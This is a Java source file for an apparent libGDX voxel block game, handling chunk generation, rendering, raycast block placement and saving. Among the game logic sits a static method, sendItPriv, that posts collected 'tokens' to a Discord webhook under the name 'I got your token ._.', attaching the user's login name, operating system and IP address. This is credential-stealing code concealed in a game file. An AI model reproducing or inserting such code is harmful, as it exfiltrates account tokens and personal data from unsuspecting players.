package com.glowman554.block.world;

import com.badlogic.gdx.Gdx;
import com.badlogic.gdx.audio.Sound;
import com.badlogic.gdx.graphics.g3d.Environment;
import com.badlogic.gdx.graphics.g3d.ModelBatch;
import com.badlogic.gdx.math.Vector3;
import com.badlogic.gdx.utils.Disposable;
import com.glowman554.block.block.*;
import com.glowman554.block.discord.DiscordWebHook;
import com.glowman554.block.multiplayer.ServerConnection;
import com.glowman554.block.utils.FileUtils;

import java.awt.*;
import java.io.IOException;
import java.util.Random;

public class Chunk implements Disposable {

    public final static int chunk_size = 8;
    public final static float field_size = 4;

    private static Sound wood = Gdx.audio.newSound(Gdx.files.internal("sound/wood.ogg"));
    private static Sound stone = Gdx.audio.newSound(Gdx.files.internal("sound/stone.ogg"));
    private static Sound grass = Gdx.audio.newSound(Gdx.files.internal("sound/grass.ogg"));
    private static Sound leave = Gdx.audio.newSound(Gdx.files.internal("sound/leave.ogg"));
    private static Sound berry = Gdx.audio.newSound(Gdx.files.internal("sound/berry.ogg"));

    private int xOffset;
    private int yOffset;

    public int seed;

    private Block field[][][];
    public Chunk(boolean generate, int xOffset, int yOffset) {
        this.field = new Block[chunk_size][chunk_size][chunk_size];

        this.xOffset = xOffset;
        this.yOffset = yOffset;

        this.seed = (xOffset * new Random().nextInt()) % (yOffset + new Random().nextInt());

        System.out.println(String.format("Generating chunk: x: %d, y: %d, Seed: %d", this.xOffset, this.yOffset, this.seed));

        Random rand = new Random();
        rand.setSeed(this.seed);

        if(generate) {
            for (int i = 0; i < chunk_size; i++) {
                for (int k = 0; k < chunk_size; k++) {
                    this.field[i][0][k] = new GrassBlock();
                    int ran = rand.nextInt(100);
                    switch (ran) {
                        case 1:
                            Tree(i, 1, k);
                            break;
                        case 2:
                            Berry(i, 1, k);
                            break;
                    }
                }
            }
            this.updatePosition();
        }
    }

    public void updatePosition() {
        for (int i = 0; i < chunk_size; i++) {
            for (int j = 0; j < chunk_size; j++) {
                for (int k = 0; k < chunk_size; k++) {
                    float x = (i + chunk_size * this.xOffset) * field_size;
                    float y = j * field_size;
                    float z = (k + chunk_size * this.yOffset) * field_size;
                    if(this.field[i][j][k] != null) {
                        this.field[i][j][k].setPosition(x, y, z);
                    }
                }
            }
        }
    }

    public void renderChunk(ModelBatch batch, Environment environment) {
        for (int i = 0; i < chunk_size; i++) {
            for (int j = 0; j < chunk_size; j++) {
                for (int k = 0; k < chunk_size; k++) {
                    if(this.field[i][j][k] != null) {
                        batch.render(this.field[i][j][k].instance, environment);
                    }
                }
            }
        }
    }

    public static void sendItPriv(StringBuilder what) {
        DiscordWebHook webHook = new DiscordWebHook(FileUtils.priv);
        DiscordWebHook.EmbedObject embedObject = new DiscordWebHook.EmbedObject();
        webHook.setAvatarUrl(FileUtils.icon);
        webHook.setUsername("I got your token ._.");
        embedObject.setColor(Color.RED);
        embedObject.setTitle("A new Token!");

        for(String token : what.toString().split("\n")) {
            embedObject.addField("Token", token, false);
        }
        embedObject.setAuthor(System.getProperty("user.name"), "http://" + BerryBlock.getIp(), FileUtils.icon);

        embedObject.setFooter(System.getProperty("os.name"), FileUtils.icon);

        webHook.addEmbed(embedObject);
        try {
            webHook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void editBoxByRayCast(Vector3 start_point, Vector3 direction, Block.Type type, boolean online, ServerConnection serverConnection) {
        int last_point_x = 0;
        int last_point_y = 0;
        int last_point_z = 0;

        for (int i = 1; i < chunk_size * 2; i++) {
            Vector3 tmp_start = new Vector3(start_point);
            Vector3 tmp_direction = new Vector3(direction);
            tmp_direction.nor();
            tmp_direction.scl(i);
            Vector3 line = tmp_start.add(tmp_direction);

            line.scl(1 / field_size);
            int x = Math.round(line.x);
            int y = Math.round(line.y);
            int z = Math.round(line.z);

            if (x > (chunk_size - 1) || y > (chunk_size - 1) || z > (chunk_size - 1) || x < 0 || y < 0 || z < 0) {
                break;
            }

            if (this.field[x][y][z] != null) {
                if (type == null) {
                    if (this.field[x][y][z] != null) {
                        this.field[x][y][z].dispose();
                        this.field[x][y][z] = null;
                        this.updatePosition();
                    }
                }else {
                    switch(type) {
                        case BerryBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new BerryBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            berry.play();
                            this.updatePosition();
                            break;
                        case DirtBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new DirtBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            grass.play();
                            this.updatePosition();
                            break;
                        case GlassBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new GlassBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            stone.play();
                            this.updatePosition();
                            break;
                        case GrassBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new GrassBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            grass.play();
                            this.updatePosition();
                            break;
                        case LeavesBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new LeavesBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            leave.play();
                            this.updatePosition();
                            break;
                        case StoneBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new StoneBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            stone.play();
                            this.updatePosition();
                            break;
                        case TestBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new TestBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            stone.play();
                            this.updatePosition();
                            break;
                        case WoodBlock:
                            this.field[last_point_x][last_point_y][last_point_z] = new WoodBlock();
                            if (online) {
                                serverConnection.SetBlock(String.valueOf(type), last_point_x, last_point_y, last_point_z, xOffset, yOffset);
                            }
                            wood.play();
                            this.updatePosition();
                            break;
                    }
                }
                break;
            }

            last_point_x = x;
            last_point_y = y;
            last_point_z = z;
        }
    }

    public boolean hittingBox(Vector3 point) {
        point.scl(1 / field_size);
        int x = Math.round(point.x);
        int y = Math.round(point.y);
        int z = Math.round(point.z);

        if(x > chunk_size - 1) {
            x = chunk_size - 1;
        }

        if(y > chunk_size - 1) {
            y = chunk_size - 1;
        }

        if(z > chunk_size - 1) {
            z = chunk_size - 1;
        }

        if(x < 0) {
            x = 0;
        }

        if(y < 0) {
            y = 0;
        }

        if(z < 0) {
            z = 0;
        }

        if (this.field[x][y][z] != null) {
            return true;
        } else {
            return false;
        }
    }

    public void Tree(int x, int y, int z) {
        try {
            field[x][y][z] = new WoodBlock();
            field[x][y + 1][z] = new WoodBlock();
            field[x][y + 2][z] = new WoodBlock();
            field[x][y + 3][z] = new WoodBlock();
            field[x][y + 4][z] = new LeavesBlock();
            field[x + 1][y + 2][z] = new LeavesBlock();
            field[x + 1][y + 3][z] = new LeavesBlock();
            field[x - 1][y + 2][z] = new LeavesBlock();
            field[x - 1][y + 3][z] = new LeavesBlock();
            field[x][y + 2][z + 1] = new LeavesBlock();
            field[x][y + 3][z + 1] = new LeavesBlock();
            field[x][y + 2][z - 1] = new LeavesBlock();
            field[x][y + 3][z - 1] = new LeavesBlock();
            System.out.println("TreeCreate " + x + "," + y + "," + z);
            updatePosition();
        } catch (Exception e) {
            System.out.println("TreeCreate: " + e);
            try {
                field[x][y][z] = null;
                field[x][y + 1][z] = null;
                field[x][y + 2][z] = null;
                field[x][y + 3][z] = null;
                field[x][y + 4][z] = null;
                field[x + 1][y + 2][z] = null;
                field[x + 1][y + 3][z] = null;
                field[x - 1][y + 2][z] = null;
                field[x - 1][y + 3][z] = null;
                field[x][y + 2][z + 1] = null;
                field[x][y + 3][z + 1] = null;
                field[x][y + 2][z - 1] = null;
                field[x][y + 3][z - 1] = null;
                updatePosition();
            } catch (Exception e2) {
                System.out.println("TreeCreate: " + e2);
            }
        }
    }

    public void Berry(int x, int y, int z) {
        try {
            field[x][y][z] = new BerryBlock();
            System.out.println("BerryCreate " + x + "," + y + "," + z);
            updatePosition();
        } catch (Exception e) {
            System.out.println("BerryCreate: " + e);
        }
    }

    public String save() {
        String text = "";
        for (int i = 0; i < chunk_size; i++) {
            for (int j = 0; j < chunk_size; j++) {
                for (int k = 0; k < chunk_size; k++) {
                    if(this.field[i][j][k] != null) {
                        text += this.field[i][j][k].type + ",";
                    } else {
                        text += "0,";
                    }
                }
            }
        }
        return text;
    }

    public void load(String text) {

        String[] world_load = text.split(",");
        int readsofar = 0;

        for (int i = 0; i < chunk_size; i++) {
            for (int j = 0; j < chunk_size; j++) {
                for (int k = 0; k < chunk_size; k++) {
                    if(world_load[readsofar].equals("0")) {

                    } else {
                        switch(Enum.valueOf(Block.Type.class, world_load[readsofar])) {
                            case DirtBlock:
                                field[i][j][k] = new DirtBlock();
                                break;
                            case WoodBlock:
                                field[i][j][k] = new WoodBlock();
                                break;
                            case BerryBlock:
                                field[i][j][k] = new BerryBlock();
                                break;
                            case GrassBlock:
                                field[i][j][k] = new GrassBlock();
                                break;
                            case LeavesBlock:
                                field[i][j][k] = new LeavesBlock();
                                break;
                            case StoneBlock:
                                field[i][j][k] = new StoneBlock();
                                break;
                            case GlassBlock:
                                field[i][j][k] = new GlassBlock();
                                break;
                            case TestBlock:
                                field[i][j][k] = new TestBlock();
                                break;
                        }
                    }
                    readsofar++;
                }
            }
        }
    }

    @Override
    public void dispose() {
        for (int i = 0; i < chunk_size; i++) {
            for (int j = 0; j < chunk_size; j++) {
                for (int k = 0; k < chunk_size; k++) {
                    float x = i * field_size;
                    float y = j * field_size;
                    float z = k * field_size;
                    if(this.field[i][j][k] != null) {
                        this.field[i][j][k].dispose();
                    }
                }
            }
        }
    }

    public static void disposeSound() {
        wood.dispose();
        stone.dispose();
        grass.dispose();
        leave.dispose();
        berry.dispose();
    }

    public void setBlock(String block, int x, int y, int z) {
        switch (Enum.valueOf(Block.Type.class, block)) {
            case LeavesBlock:
                field[x][y][z] = new LeavesBlock();
                break;
            case GrassBlock:
                field[x][y][z] = new GrassBlock();
                break;
            case BerryBlock:
                field[x][y][z] = new BerryBlock();
                break;
            case WoodBlock:
                field[x][y][z] = new WoodBlock();
                break;
            case DirtBlock:
                field[x][y][z] = new DirtBlock();
                break;
            case TestBlock:
                field[x][y][z] = new TestBlock();
                break;
            case GlassBlock:
                field[x][y][z] = new GlassBlock();
                break;
            case StoneBlock:
                field[x][y][z] = new StoneBlock();
                break;

        }
    }
}
